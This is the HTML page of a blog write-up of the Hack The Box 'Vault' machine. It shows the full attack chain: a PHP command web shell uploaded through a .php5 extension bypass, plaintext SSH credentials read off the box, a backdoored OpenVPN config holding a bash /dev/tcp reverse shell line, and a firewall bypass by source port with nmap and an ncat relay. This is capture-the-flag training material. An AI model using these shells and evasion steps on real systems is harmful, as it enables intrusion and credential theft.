@@ -1,0 +1,812 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Vault - Hack The Box - hackcommander.io</title>
+<meta name="description" content="This is the writeup for Vault, a machine with pivoting across different network segments.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Vault - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-vault/">
+
+
+  <meta property="og:description" content="This is the writeup for Vault, a machine with pivoting across different network segments.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-vault/vault_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-04-06T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-vault/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Vault - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Vault - Hack The Box">
+    <meta itemprop="description" content="This is the writeup for Vault, a machine with pivoting across different network segments.">
+    <meta itemprop="datePublished" content="April 06, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Vault - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-04-06T00:00:00+02:00">April 06, 2019 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-vault/vault_logo.png" alt=""></p>
+
+<h2 id="quick-summary">Quick summary</h2>
+
+<ul>
+  <li>An upload page allows us to get RCE by uploading a PHP file with the <code class="language-plaintext highlighter-rouge">php5</code> file extension</li>
+  <li>We can find the SSH credentials in a plaintext file in Dave’s directory</li>
+  <li>After getting a foothold on the box, we find another network segment with another machine on it</li>
+  <li>The machine has OpenVPN installed and already has a backdoored <code class="language-plaintext highlighter-rouge">ovpn</code> configuration file that let us get a reverse shell there</li>
+  <li>There’s yet another network segment and host that we discover by looking at the routing table and host file</li>
+  <li>The next target is protected by a firewall but the firewall allows us to connect through it by changing the source port of our TCP session</li>
+  <li>After logging in to the last box we find a gpg encrypted file which we can decrypt on the host OS since we have the private key and the password</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed steps</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>Port 22 and 80 are open:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Sat Nov  3 23:09:53 2018 as: nmap -F -sC -sV -oA vault 10.10.10.109
+Nmap scan report for vault.htb (10.10.10.109)
+Host is up (0.023s latency).
+Not shown: 98 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
+|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
+|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web enumeration</h3>
+
+<p>There’s not much on the main page except a mention about <code class="language-plaintext highlighter-rouge">Sparklays</code></p>
+
+<p><img src="/assets/images/htb-writeup-vault/web.png" alt=""></p>
+
+<p>A gobuster scan with <code class="language-plaintext highlighter-rouge">big.txt</code> in the root directory reveals nothing but if we start with <code class="language-plaintext highlighter-rouge">/sparklays</code> we find a few directories:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -t 50 -w big.txt -u http://vault.htb -s 200,204,301,302,307
+
+# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays -s 200,204,301,302,307
+/design (Status: 301)
+
+# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays/design -s 200,204,301,302,307
+/uploads (Status: 301)
+</code></pre></div></div>
+
+<p>Further scanning with <code class="language-plaintext highlighter-rouge">raft-small-words</code> and <code class="language-plaintext highlighter-rouge">.html</code> extension reveals <code class="language-plaintext highlighter-rouge">design.html</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -t 50 -w raft-small-words.txt -u http://vault.htb/sparklays/design -x php,html -s 200,204,301,302,307
+/uploads (Status: 301)
+/design.html (Status: 200)
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-vault/design.png" alt=""></p>
+
+<p>The link goes to an upload page. Upload pages are interesting because if we can upload a PHP file then we can get RCE on the target machine.</p>
+
+<p><img src="/assets/images/htb-writeup-vault/changelogo.png" alt=""></p>
+
+<p>I used a simple PHP command shell:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;</span>
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+<span class="nt">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>When we try to upload a simple PHP command shell we get a <code class="language-plaintext highlighter-rouge">sorry that file type is not allowed</code> error message.</p>
+
+<p>After trying a few different file types, I noticed we can use the <code class="language-plaintext highlighter-rouge">.php5</code> file extension and we get a <code class="language-plaintext highlighter-rouge">The file was uploaded successfully</code> message.</p>
+
+<p>We now have RCE:</p>
+
+<p><img src="/assets/images/htb-writeup-vault/rce.png" alt=""></p>
+
+<p>Found a couple of interesting files in Dave’s desktop folder:</p>
+
+<p><strong>http://vault.htb/sparklays/design/uploads/shell.php5?cmd=ls%20-l%20/home/dave/Desktop</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 12
+-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers
+-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key
+-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 ssh
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">ssh</code> file contains plaintext credentials:</p>
+
+<p><strong>http://vault.htb/sparklays/design/uploads/shell.php5?cmd=cat%20/home/dave/Desktop/ssh</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave
+Dav3therav3123
+</code></pre></div></div>
+
+<h3 id="shell-access">Shell access</h3>
+
+<p>Using the SSH credentials we found in Dave’s directory we can now log in:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109
+dave@10.10.10.109's password:
+
+Last login: Sat Nov  3 19:59:05 2018 from 10.10.15.233
+dave@ubuntu:~$
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">~/Desktop</code> directory contains a couple of interesting files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@ubuntu:~/Desktop$ ls -l
+total 12
+-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key
+-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers
+-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 ssh
+
+dave@ubuntu:~/Desktop$ cat key
+itscominghome
+
+dave@ubuntu:~/Desktop$ cat Servers
+DNS + Configurator - 192.168.122.4
+Firewall - 192.168.122.5
+The Vault - x
+
+dave@ubuntu:~/Desktop$ cat ssh
+dave
+Dav3therav3123
+</code></pre></div></div>
+
+<p>The user also has a gpg keyring:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@ubuntu:~/.gnupg$ ls -l
+total 28
+drwx------ 2 dave dave 4096 Jul 17  2018 private-keys-v1.d
+-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg
+-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg~
+-rw------- 1 dave dave  600 Sep  3  2018 random_seed
+-rw------- 1 dave dave 4879 Jul 24  2018 secring.gpg
+-rw------- 1 dave dave 1280 Jul 24  2018 trustdb.gpg
+</code></pre></div></div>
+
+<p>Based on the <code class="language-plaintext highlighter-rouge">Servers</code> file it seems there are other VMs or containers running. We can confirm this also by checking the network interfaces (there’s a virtual bridge interface with the same subnet mentionned in the <code class="language-plaintext highlighter-rouge">Server</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@ubuntu:~/Desktop$ ifconfig
+ens33     Link encap:Ethernet  HWaddr 00:50:56:b2:8d:92
+          inet addr:10.10.10.109  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb2:8d92/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb2:8d92/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:484701 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:372962 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:61423226 (61.4 MB)  TX bytes:123066398 (123.0 MB)
+
+virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49
+          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:34 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:2296 (2.2 KB)  TX bytes:731 (731.0 B)
+</code></pre></div></div>
+
+<p>We can do a poor man’s port scan using netcat and find the host <code class="language-plaintext highlighter-rouge">192.168.122.4</code> with two ports open:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@ubuntu:~/Desktop$ nc -nv 192.168.122.4 -z 1-1000 2&gt;&amp;1 | grep -v failed
+Connection to 192.168.122.4 22 port [tcp/*] succeeded!
+Connection to 192.168.122.4 80 port [tcp/*] succeeded!
+</code></pre></div></div>
+
+<p>We’ll setup SSH port forwarding so we can get to the 2nd host:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109 -L 80:192.168.122.4:80
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-vault/dnsserver.png" alt=""></p>
+
+<p><code class="language-plaintext highlighter-rouge">dns-config.php</code> is an invalid link (404).</p>
+
+<p>The 2nd link brings us to a VPN configuration page where we can update an ovpn file.</p>
+
+<p><img src="/assets/images/htb-writeup-vault/vpnconfig.png" alt=""></p>
+
+<p>With gobuster, we find additional information in <code class="language-plaintext highlighter-rouge">/notes</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -t 50 -w big.txt -u http://127.0.0.1 -s 200,204,301,302,307
+/notes (Status: 200)
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-vault/notes.png" alt=""></p>
+
+<p>We can grab <code class="language-plaintext highlighter-rouge">http://127.0.0.1/123.ovpn</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remote 192.168.122.1
+dev tun
+nobind
+script-security 2
+up "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/2323 0&gt;&amp;1'"
+</code></pre></div></div>
+
+<p>And <code class="language-plaintext highlighter-rouge">http://127.0.0.1/script.sh</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+sudo openvpn 123.ovpn
+</code></pre></div></div>
+
+<p>So it seems that the <code class="language-plaintext highlighter-rouge">123.ovpn</code> file contains a reverse shell payload.</p>
+
+<p>We can just spawn a netcat on the box and trigger the <code class="language-plaintext highlighter-rouge">Test VPN</code> function to get a shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@ubuntu:~$ nc -lvnp 2323
+Listening on [0.0.0.0] (family 0, port 2323)
+Connection from [192.168.122.4] port 2323 [tcp/*] accepted (family 2, sport 60596)
+bash: cannot set terminal process group (1131): Inappropriate ioctl for device
+bash: no job control in this shell
+root@DNS:/var/www/html# id;hostname
+id;hostname
+uid=0(root) gid=0(root) groups=0(root)
+DNS
+root@DNS:/var/www/html#
+</code></pre></div></div>
+
+<p>User flag found in Dave’s directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:/home/dave# cat user.txt
+cat user.txt
+a4947...
+</code></pre></div></div>
+
+<p>There’s also SSH credentials in there:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:/home/dave# cat ssh
+cat ssh
+dave
+dav3gerous567
+</code></pre></div></div>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>In the web directories, there’s a file that reveals two additional network segments:</p>
+<ul>
+  <li>192.168.1.0/24</li>
+  <li>192.168.5.0/24</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:/var/www/DNS# ls -la
+total 20
+drwxrwxr-x 3 root root 4096 Jul 17 12:46 .
+drwxr-xr-x 4 root root 4096 Jul 17 12:47 ..
+drwxrwxr-x 2 root root 4096 Jul 17 10:34 desktop
+-rw-rw-r-- 1 root root  214 Jul 17 10:37 interfaces
+-rw-rw-r-- 1 root root   27 Jul 17 10:35 visudo
+
+root@DNS:/var/www/DNS# cat visudo
+www-data ALL=NOPASSWD: ALL
+
+root@DNS:/var/www/DNS# cat interfaces
+auto ens3
+iface ens3 inet static
+address 192.168.122.4
+netmask 255.255.255.0
+up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
+up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
+</code></pre></div></div>
+
+<p>There’s a route in the routing table pointing to the firewall:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@DNS:~$ netstat -rn
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+192.168.5.0     192.168.122.5   255.255.255.0   UG        0 0          0 ens3
+192.168.122.0   0.0.0.0         255.255.255.0   U         0 0          0 ens3
+</code></pre></div></div>
+
+<p>In the host file we can also find a reference to our next target: 192.168.5.2</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:/home/dave# cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       DNS
+192.168.5.2     Vault
+</code></pre></div></div>
+
+<p>So, we the network topology looks like this:</p>
+
+<p><img src="/assets/images/htb-writeup-vault/network.png" alt=""></p>
+
+<p>This network is protected by a firewall, as shown earlier in the <code class="language-plaintext highlighter-rouge">Servers</code> file we found. Nmap is already installed on the DNS VM so we can use it to scan <code class="language-plaintext highlighter-rouge">192.168.5.2</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:~# nmap -P0 -p 1-10000 -T5 192.168.5.2
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 03:56 GMT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for Vault (192.168.5.2)
+Host is up (0.0019s latency).
+Not shown: 9998 filtered ports
+PORT     STATE  SERVICE
+53/tcp   closed domain
+4444/tcp closed krb524
+
+Nmap done: 1 IP address (1 host up) scanned in 243.36 seconds
+</code></pre></div></div>
+
+<p>By using the 4444 as a source port we can bypass the firewall and find another open port:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:~# nmap -g 4444 -sS -P0 -p 1-1000 192.168.5.2
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 04:16 GMT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for Vault (192.168.5.2)
+Host is up (0.0023s latency).
+Not shown: 999 closed ports
+PORT    STATE SERVICE
+987/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 3.84 seconds
+</code></pre></div></div>
+
+<p>We’ll need to SSH in by changing the source port of the TCP socket. To do that we can spawn a ncat listener that redirects to port 987 while changing the source port. Then we just SSH to ourselves on the ncat listening port.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:~# ncat -l 2222 --sh-exec "ncat 192.168.5.2 987 -p 4444"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:~# ssh -p 2222 dave@127.0.0.1  (password = dav3gerous567)
+
+Last login: Mon Sep  3 16:48:00 2018
+dave@vault:~$ id
+uid=1001(dave) gid=1001(dave) groups=1001(dave)
+
+vault:~$ ls
+root.txt.gpg
+</code></pre></div></div>
+
+<p>The only thing interesting is the <code class="language-plaintext highlighter-rouge">root.txt.gpg</code></p>
+
+<p>We can download this back to the host OS and decrypt it with the <code class="language-plaintext highlighter-rouge">itscominghome</code> key we found earlier:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:/var/www/html# ncat -l 2222 --sh-exec "ncat 192.168.5.2 987 -p 4444"
+
+dave@ubuntu:~$ scp -P 2222 dave@192.168.122.4:~/root.txt.gpg .
+dave@192.168.122.4's password: 
+root.txt.gpg                                                          100%  629     0.6KB/s   00:00
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@ubuntu:~$ gpg -d root.txt.gpg
+
+You need a passphrase to unlock the secret key for
+user: "david &lt;dave@david.com&gt;"
+4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)
+
+gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
+      "david &lt;dave@david.com&gt;"
+ca468...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#firewall" class="page__taxonomy-item" rel="tag">firewall</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#gpg" class="page__taxonomy-item" rel="tag">gpg</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#openvpn" class="page__taxonomy-item" rel="tag">openvpn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pivoting" class="page__taxonomy-item" rel="tag">pivoting</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-04-06T00:00:00+02:00">April 06, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-curling/" class="pagination--pager" title="Curling - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-redcross/" class="pagination--pager" title="Redcross - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
